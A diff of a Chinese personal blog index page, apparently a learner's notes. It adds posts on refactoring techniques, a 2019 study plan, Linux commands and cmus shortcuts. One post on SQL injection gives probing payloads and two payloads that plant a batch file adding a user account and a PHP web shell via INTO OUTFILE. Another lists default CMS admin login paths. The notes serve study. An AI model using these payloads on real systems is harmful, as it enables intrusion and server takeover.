@@ -193,7 +193,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 17.5px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 12.5px;">基础</a> <a href="/tags/存档/" style="font-size: 12.5px;">存档</a> <a href="/tags/工具/" style="font-size: 17.5px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 12.5px;">笔记</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 12.5px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
+                        <a href="/tags/C-primer/" style="font-size: 16px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 18px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 12px;">基础</a> <a href="/tags/存档/" style="font-size: 12px;">存档</a> <a href="/tags/工具/" style="font-size: 18px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 14px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 14px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 12px;">笔记</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 12px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
                     </div>
                 </section>
                 
@@ -274,6 +274,861 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-重构的设计原则" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/31/重构的设计原则/" class="article-date">
+      <time datetime="2018-12-31T12:55:41.000Z" itemprop="datePublished">2018-12-31</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/31/重构的设计原则/">重构的设计原则</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h5 id="以下取自重构改善代码的既有设计"><a href="#以下取自重构改善代码的既有设计" class="headerlink" title="以下取自重构改善代码的既有设计"></a>以下取自重构改善代码的既有设计</h5><ol>
+<li>重新组织函数<ol>
+<li>Extract Method 提炼函数<br>将需要修改的代码放到一个独立函数中，并让函数名解释该函数的用法。</li>
+<li>Inline Method内联函数<br>在函数调用点插入函数本体，然后移除该函数。</li>
+<li>Inline Temp 内联临时变量<br>将所有对该变量的引用动作，替换为对它赋值的那个表达式自身。</li>
+<li>Replace Temp with Query 以查询取代临时变量<br>将表达式提炼到一个独立函数中。将这个临时变量的所有引用点替换为对新函数的调用。此后，新函数就可以被其他函数使用。</li>
+<li>Introduce Explaining Variable 引入解释性变量<br>将该复杂表达式（或其中一部分）的结果放进一个临时变量，以此变量的名称来解释表达式的用途。</li>
+<li>Split Temporary Variable分解临时变量<br>针对每次赋值，创造一个独立、对应的临时变量。</li>
+<li>Remove Assignments to Parameters移除对参数的赋值<br>以一个临时变量取代该参数的位置</li>
+<li>Replace Method with Method Object以函数对象取代函数<br>将这个函数放进一个单独对象中，如此一来局部变量就成了对象内的字段，然后就可以在同一个对象中将这个大型函数分解为多个小型函数。</li>
+<li>Substitute Algorithm替换算法<br>将函数本体替换为另一个算法。</li>
+</ol>
+</li>
+<li>在对象之间搬移特性<ol>
+<li>Move Method 搬移函数<br>在该函数最常引用的类中建立一个有着类似行为的新函数。或将旧函数变成一个单纯的委托函数，或是将旧函数完全移除。</li>
+<li>Move Field 搬移字段<br>在目标类中新建一个字段，修改源字段中的所有用户，令它们改用新字段。</li>
+<li>Extract Class提炼类<br>建立一个新类，将相关的字段和函数从旧类搬移到新类。</li>
+<li>Inline Class将类内联化<br>将这个类的所有特性搬移到另一个类中，然后移除原类。</li>
+<li>Hide Delegate隐藏委托关系<br>在服务类上建立客户所需的所有函数，用以隐藏委托关系。</li>
+<li>Remove Middle Man移除中间人<br>让客户直接调用委托类。</li>
+<li>Introduce Foreign Method引入外加函数<br>在客户类中建立一个函数，并以第一参数的形式传入到一个服务类实例。</li>
+<li>Introduce Local Extension引入本地扩展<br>建立一个新类，使它包含这些额外函数。让这个扩展品成为源类的子类或者包装类。</li>
+</ol>
+</li>
+<li>重新组织数据<ol>
+<li>Self Encapsulate Field自封装字段<br>为这个字段建立取值/设值函数，并且只以这些函数来访问字段。</li>
+<li>Replace Data Value with Object以对象取代数据值<br>将数据项变成对象。</li>
+<li>Change Value to Reference 将值对象改为引用对象<br>将这个值对象改为引用对象</li>
+<li>Change Reference to Value 将引用对象改为值对象<br>将引用对象改为值对象</li>
+<li>Replace Array with Object以对象取代数组<br>以对象替换数组，对于数组中的每个元素，以一个字段来表示。</li>
+<li>Duplicate Observed Data复制“被监视数据”<br>将该数据复制到一个领域对象中，建立一个Observer模式，用以同步领域对象和GUI对象内的重复数据。</li>
+<li>Change Unidirectional Association to Bidirectional将单向关联改为双向关联<br>添加一个反向指针，并使修改函数能够同时更新两条连接。</li>
+<li>Change Bidirectional Association to Unidirectional将双向关联改为单项关联<br>去除不必要的关联。</li>
+<li>Replace Magic Number with Symbolic Constant以字面常量取代魔法数<br>创造一个常量，根据其意义为它命名，并将上述的字面数值替换为这个常量。</li>
+<li>Encapsulate Field封装字段<br>将它声明为private，并提供相应的访问函数。</li>
+<li>Encapsulate Collection 封装集合<br>让这个函数返回该集合的一个只读副本，并在这个类中提供添加/移除集合元素的函数</li>
+<li>Replace Record with Data Class以数据类取代记录<br>为该记录创建一个“哑”数据对象。</li>
+<li>Replace Type Code with Class以类取代枚举<br>以一个新的class替换该枚举类型</li>
+<li>Replace Type COde with Subclasses以子类取代枚举<br>以一个子类取代这个枚举变量</li>
+<li>Replace Type Code with State/Strategy</li>
+<li>Replace Subclass with Fields以值域取代子类<br>如果你的各个subclasses的唯一差别只在返回常量数据的函数身上，修改这些函数，使它返回superclass中的某个新增值域，然后销毁subclasses</li>
+</ol>
+</li>
+<li>简化条件表达式<ol>
+<li>Decompose Conditional分解条件式<br>从if 、else 的段落中分别提炼出独立函数</li>
+<li>Consolidate Conditional Expression合并表达式<br>合并可以合并的条件式，并将这个条件式提炼成为一个独立函数。</li>
+<li>Consolidate Duplicate Conditional Fragments 合并重复的条件片段<br>将重复的代码搬移到条件式之外。</li>
+<li>Remove Control Flag 移除控制标记<br>以break语句或者return语句取代控制标记。</li>
+<li>Replace Nested Conditional with Guard Clauses以卫语句取代嵌套条件式<br>使用卫语句表现所有的特殊情况。</li>
+<li>Replace Conditional with Polymorphism以多态取代表达式<br>如果有一个条件式，会根据对象类型的不同而选择不同的行为，将这个表达式每个分支放进一个subclass内的覆写函数中，然后将原始函数声明为抽象函数。</li>
+<li>Introduce Null Object引入Null对象<br>将null value替换为null object</li>
+<li>Introduce Assertion引入断言<br>如果某一段代码需要对程序状态做出某种假设。那么请以assertion明确表现这种假设。</li>
+</ol>
+</li>
+<li>简化函数调用<ol>
+<li>Rename Method</li>
+<li>Add Parameter</li>
+<li>Remove Parameter</li>
+<li>Separate Query from Modifier将查询函数和修改函数分离</li>
+<li>Parameterize Method令函数携带参数</li>
+<li>Replace Parameter with Explicit Methods 以明确函数取代参数</li>
+<li>Preserve Whole Object保持对象完整。<br>如果需要从某个对象中取出若干值，将它们作为某一次函数调用时的参数。那么应该改成传递整个对象。</li>
+<li>Replace Parameter with Methods 以函数取代参数<br>对象调用某个函数，并将所得结果作为参数，传递给另一个函数。而接受该参数的函数也可以调用前一个函数，那么让参数接受者去除该项参数，并直接调用前一个函数。</li>
+<li>Introduce Parameter Object引入参数对象<br>某些参数总是很自然的同时出现，那么以一个对象取代这些参数。</li>
+<li>Remove Setting Method移除设值函数<br>如果对象里的某些成员变量在对象初创时被设值，然后就不再改变，那么去掉该成员变量的设值函数。</li>
+<li>Hide Method 隐藏某个函数</li>
+<li>Replace Constructor with Factory Method 以工厂函数取代构造函数<br>如果你希望在创建对象时不仅仅是对它做简单的构建动作，那么用工厂函数取代构造函数</li>
+<li>Encapsulate Downcast 封装向下转型动作。<br>将向下转型的动作移到函数中。</li>
+<li>Replace Error Code with Exception以异常取代错误码</li>
+<li>Replace Exception with Test以测试取代异常<br>在调用函数之前先检查</li>
+</ol>
+</li>
+<li>处理概括关系<ol>
+<li>Pull Up Field 值域上移<br>两个子类有相同的成员变量，那么将成员变量移动到父类中。</li>
+<li>Pull Up Method函数上移</li>
+<li>Pull Up Constructor Body</li>
+<li>Push Down Field</li>
+<li>Push Down Method</li>
+<li>Extract Subclass 提炼子类</li>
+<li>Extract Superclass 提炼父类</li>
+<li>Extract Interface提炼接口</li>
+<li>Collapse Hierarchy折叠继承体系</li>
+<li>Form Template Method 塑造模板函数</li>
+<li>Replace Inheritance with Delegation 以委托取代继承</li>
+<li>Replace Delegation with Inheritance</li>
+</ol>
+</li>
+<li>大型重构、重构、复用与现实<ol>
+<li>Tease Apart Inheritance 梳理并分解继承体系</li>
+<li>Convert Procedural Design to Objects将过程化设计转化为对象设计</li>
+<li>Separate Domain from PRESENTATION 将领域和表述/显示分离</li>
+<li>Extract Hierarchy提炼继承体系</li>
+</ol>
+</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/C/">C++</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/重构/">重构</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-2019计划-随时变动版" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/31/2019计划-随时变动版/" class="article-date">
+      <time datetime="2018-12-31T11:04:33.000Z" itemprop="datePublished">2018-12-31</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/31/2019计划-随时变动版/">2019计划[随时变动版]</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h5 id="又到了每年年底做下一年的（吹）计（牛）划（逼）的时候了，但是这次比较6的是自己不但吹了，还写下来了，还发出来了（虽然并不会有人看，但还是请我掐会腰），以下"><a href="#又到了每年年底做下一年的（吹）计（牛）划（逼）的时候了，但是这次比较6的是自己不但吹了，还写下来了，还发出来了（虽然并不会有人看，但还是请我掐会腰），以下" class="headerlink" title="又到了每年年底做下一年的（吹）计（牛）划（逼）的时候了，但是这次比较6的是自己不但吹了，还写下来了，还发出来了（虽然并不会有人看，但还是请我掐会腰），以下"></a>又到了每年年底做下一年的（吹）计（牛）划（逼）的时候了，但是这次比较6的是自己不但吹了，还写下来了，还发出来了（虽然并不会有人看，但还是请我掐会腰），以下</h5><ol>
+<li>配置好mac虚拟机，达到生产环境能用的程度。     [ get,因为并不知道生产环境需要什么东东，还是傻鸟好用 ]</li>
+<li>将有道笔记中的内容搬运到博客上。</li>
+<li>读完书虫学前版部分共两个版本。</li>
+<li>学会写linux脚本，到达初学者水平[并不知道初学者什么水平系列]</li>
+<li>学会学python脚本，到达初学者水平[并不知道初学者什么水平系列]</li>
+<li>学会写windows脚本，到达初学者水平[并不知道初学者什么水平系列]</li>
+<li>入门渗透测试，作为第一主攻方向[废话系列]</li>
+<li>入门逆向，作为第二主攻方向[废话系列]</li>
+<li>学会写sql脚本，到达能熟练使用sql注入的水平[依然废话系列]</li>
+<li>学习html，到达能看懂的水平。</li>
+<li>学习吉他[买的吉他不能吃灰]</li>
+<li>整理欧洲音乐史的时间线[掐会腰系列]</li>
+<li>学会烤戚风蛋糕[掐会腰系列]</li>
+<li>学习b站视频<ul>
+<li>kali入门教程[撇一眼自己的傻鸟]</li>
+<li>经典web漏洞深度讲解</li>
+<li>2018中级信息安全工程师视频</li>
+<li>麦子学院web安全教程</li>
+<li>米安网 无线网络安全</li>
+<li>ctf入门视频</li>
+<li>二进制安全深入理解</li>
+<li>web 安全渗透工程师</li>
+<li>深入研究windows内部原理系列</li>
+<li>linux-web安全渗透[千峰教育]</li>
+<li>游戏逆向-植物大战僵尸逆向分析</li>
+<li>cracer 教程</li>
+<li>西普杯解析</li>
+<li>基本乐理[付妮版本]</li>
+<li>新概念英语第二册</li>
+<li>858计算机系统安全   </li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/碎碎念/">碎碎念</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/计划/">计划</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-linux知识点总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/30/linux知识点总结/" class="article-date">
+      <time datetime="2018-12-30T13:51:53.000Z" itemprop="datePublished">2018-12-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/30/linux知识点总结/">linux知识点总结</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ol>
+<li>主分区只能有四个，拓展分区只能有一个，并且算作主分区的一种，即为主分区加拓展分区一共四个。</li>
+<li>逻辑分区：逻辑分区是在扩展分区中划分的，如果是IDE硬盘，Linux最多支持59个逻辑分区，如果是SCSI硬盘，LInux最多支持11个逻辑分区<br>扩展分区不能格式化，也不能写入数据</li>
+<li>分区号1、2、3、4只能给主分区和扩展分区使用，不能给逻辑分区使用</li>
+<li>ext4最大支持1EB文件系统和16TB的文件</li>
+<li>根下的proc和sysfs是内存挂载点</li>
+<li>文件系统查看命令df -h 使用习惯单位显示容量<br>-a显示所有的文件系统信息，包括特殊文件系统，比如/proc、/sysfs<br>-T显示文件系统类型</li>
+<li>ls查看目录的大小只能统计一级目录的文件名所占大小</li>
+<li>统计目录或文件大小     -a 显示每个子文件的磁盘占用量，默认只统计子目录的磁盘占用量<br>-h使用习惯单位显示磁盘占用量<br>-s统计总占用量，而不列出子目录和子文件的占用量</li>
+<li>df命令是从文件系统考虑的，不光要考虑文件占用的空间，还要统计被命令或程序占用的空间（最常见的就是文件已经被删除了，但是程序并没有释放空间）</li>
+<li>du命令是面向文件的，只会计算文件或目录占用的空间， df看到的空间才是真正的可以使用的空间</li>
+<li>文件系统修复命令fsck [选项] 分区设备文件名<br>-a 不用显示用户提示，自动修复文件系统<br>-y 自动修复，和-a 作用一致，不过有些文件系统只支持-y</li>
+<li>dumpe2fs 查询分区的数据块（主要是超级块）</li>
+<li>mount    -l 查询系统中已经挂载的设备，显示卷标名称<br>   -a 依据配置文件/etc/fstab的内容，自动挂载<pre><code>[-t 文件系统]   [ -L卷标名 ]   [ -o 特殊选项]   设备文件名   挂载点
+</code></pre>-o特殊选项中有noexec参数，可以导致可执行文件无法执行，并且不受root用户和chmod权限的制约</li>
+<li>一般来讲，/media目录用来挂载光盘，/mnt挂载U盘</li>
+<li>umount 设备文件名或挂载点</li>
+<li>mount -t ntfs-3g 分区 挂载点</li>
+<li>fdisk 分区命令  -d 删除分区<br>-t  更改分区ID号<br>-n 新建分区<br>-w 保存退出<br>-q 不保存退出<br>-l  查看分区类型</li>
+<li>partprobe重新读取分区表信息</li>
+<li>mkfs -t  文件类型  分区盘符    格式化分区</li>
+<li>mkswap 分区盘符     格式化swap分区<br>swapon  分区盘符   把分区盘符加入swap分区<br>swapoff   分区盘符  把分区盘符从交换空间取消</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/笔记/">笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-cmus使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/30/cmus使用/" class="article-date">
+      <time datetime="2018-12-30T13:43:13.000Z" itemprop="datePublished">2018-12-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/30/cmus使用/">cmus使用</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>[q]             quit -i                         退出</li>
+<li>[^C]            :quit<enter> to exit cmus.      退出（^就是ctrl的意思）</enter></li>
+<li>[b]             player-next                     下一首</li>
+<li>[c]             player-pause                    暂停</li>
+<li>[ x]             player-play                     播放</li>
+<li>[z]             player-prev                     前一首</li>
+<li>[v]             player-stop                     停止</li>
+<li>[^L]            refresh                         刷新</li>
+<li>[n]             search-next                     查找下一个</li>
+<li>[N]             search-prev                     查找上一个</li>
+<li>[.]             seek +1m                        快进</li>
+<li>[l], [right]    seek +5                         快快进</li>
+<li>[,]             seek -1m                        快退</li>
+<li>[h], [left]     seek -5                         快快退</li>
+<li>[M]             toggle play_library             切换到playlist</li>
+<li>[o]             toggle play_sorted              切换成all from sorted library</li>
+<li>[^R]            toggle repeat_current           对当前循环</li>
+<li>[t]             toggle show_remaining_time      显示剩余时间（默认是显示播放时间）</li>
+<li>[s]             toggle shuffle                  乱序播放</li>
+<li>[i]             toggle show-hidden              显示/取消显示隐藏文件</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux工具/">linux工具</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-linux命令行与脚本编程笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/30/linux命令行与脚本编程笔记/" class="article-date">
+      <time datetime="2018-12-30T13:29:17.000Z" itemprop="datePublished">2018-12-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/30/linux命令行与脚本编程笔记/">linux命令行与脚本编程笔记</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ol>
+<li>Linux内核负责的四项功能：<ul>
+<li>系统内存管理</li>
+<li>软件程序管理</li>
+<li>硬件设备管理</li>
+<li>文件系统管理</li>
+</ul>
+</li>
+<li>硬盘中的swap空间指的是虚拟内存空间</li>
+<li>/proc/meminfo文件中保存了当前内存的状态，包括虚拟内存</li>
+<li>系统开机自启动的进程放在/etc/inittab中</li>
+<li>Linux系统将硬件设备当成特殊的文件，称为设备文件。设备文件有3种不同的分类：<ul>
+<li>字符型设备文件;</li>
+<li>块设备文件。</li>
+<li>网络设备文件。</li>
+</ul>
+</li>
+<li>字符型设备文件是指处理数据时每次只能处理一个字符的设备，大多数的调制解调器和终端都是作为字符型设备文件创建的。</li>
+<li>块设备文件是指处理数据时每次能处理大块数据的设备，比如硬盘。</li>
+<li>网络设备文件是指采用数据包发送和接收数据的设备，包括各种网卡和一个特殊的回环设备。这个回环设备允许Linux系统使用通用的网络编程协议同自己通信。</li>
+<li>LInux为系统上的每个设备都创建一种特殊的文件，称为”节点“。与设备的所有通信都是通过设备节点来完成的。</li>
+<li>GNU项目为Linux系统提供了一组核心工具被成为coreutils软件包。它由三部分构成：<ul>
+<li>用以处理文件的工具</li>
+<li>用以操作文本的工具</li>
+<li>用以管理进程的工具</li>
+</ul>
+</li>
+<li>未完待续P42</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/笔记/">笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-C-中的return" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/30/C-中的return/" class="article-date">
+      <time datetime="2018-12-30T13:21:16.000Z" itemprop="datePublished">2018-12-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/30/C-中的return/">C++中的return</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>构造函数中是可以包含return的，我记得在函数的末尾会有一个隐含的return。构造函数应该也适用于它，所以可以显式的加入return语句，但是不能有返回值。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/C/">C++</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C-语法/">C++语法</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/sql注入/" class="article-date">
+      <time datetime="2018-12-24T13:55:10.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/sql注入/">sql注入</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <ul>
+<li>定义： 攻击者利用应用程序根据提交的数据动态生成sal命令的特性，在url、表单域或者其他的输入域中输入自己的sql命令，改变sql命令的操作，将被修改的sql命令注入到后端数据库引擎中执行。</li>
+<li>危害：<ol>
+<li>数据库信息泄漏</li>
+<li>网页篡改</li>
+<li>挂马</li>
+<li>服务器被远程控制</li>
+<li>瘫痪全系统</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li>常用sql语句<ul>
+<li>判断数据库<ul>
+<li><code>and exsits(select * from msysobjects)&gt;0</code> access</li>
+<li><code>and exsits(select * from sysobjects)&gt;0</code> sqlserver</li>
+</ul>
+</li>
+<li>判断数据库表<ul>
+<li><code>and exists(select * from admin)</code></li>
+</ul>
+</li>
+<li>判断数据库列名<ul>
+<li><code>and exists(select admin from admin)</code></li>
+</ul>
+</li>
+<li>判断数据字段内容的长度<ul>
+<li><code>and (select len(admin) from admin)=5</code> 如果返回正常说明管理员账户的长度为5</li>
+</ul>
+</li>
+<li>判断数据第一个字符内容<ul>
+<li>and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100 返回正常说明该字符的ascii码值大于100</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>偏移注入<br>偏移注入的产生主要是用来解决表名猜到，列名猜不到的情况。使用的sql语句为<br><code>http://127.0.0.1:33/0/simple.asp?id=22 union select 1,2,3,4,5,6,7,8 from admin</code></p>
+</li>
+<li><p>利用注入漏洞执行系统命令</p>
+<ul>
+<li><p>第一种方法： 需要有系统权限<br><code>and 1 = 2 union select 1, &quot;net user seven 123 /add&quot;, 2,3,4 into outfile &#39;C://Documments and Settings/Administrator/[开始] 菜单/程序/启动/1.bat&#39;</code></p>
+</li>
+<li><p>第二种方法<br><code>and 1 = 2 union select 1, &quot;&lt;pre&gt;&lt;body&gt;&lt;?@system($_GET[&#39;cc&#39;]);?&gt;&lt;/body&gt;&lt;/pre&gt;&quot;,3,4,5,6,7 into outfile &#39;C:/Inetpub/wwwroot/mysql-sql/cr.php&#39;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-httpfuzzer" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/httpfuzzer/" class="article-date">
+      <time datetime="2018-12-24T13:52:44.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/httpfuzzer/">httpfuzzer</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-cms" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/12/24/cms/" class="article-date">
+      <time datetime="2018-12-24T13:44:16.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/12/24/cms/">cms</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>网站常见后台有：</p>
+<ul>
+<li>织梦</li>
+<li>discuz</li>
+<li>帝国</li>
+<li>phpweb</li>
+<li>wordpress</li>
+<li>aspcms</li>
+<li>科讯</li>
+<li>南方</li>
+<li>良精</li>
+<li>ecshop</li>
+</ul>
+<p>常见默认管理页面：</p>
+<ul>
+<li>admin</li>
+<li>admin.php</li>
+<li>wp-admin</li>
+<li>manager</li>
+<li>login_admin</li>
+<li>login_manager</li>
+<li>login.asp</li>
+<li>houtai</li>
+<li>denglu</li>
+</ul>
+
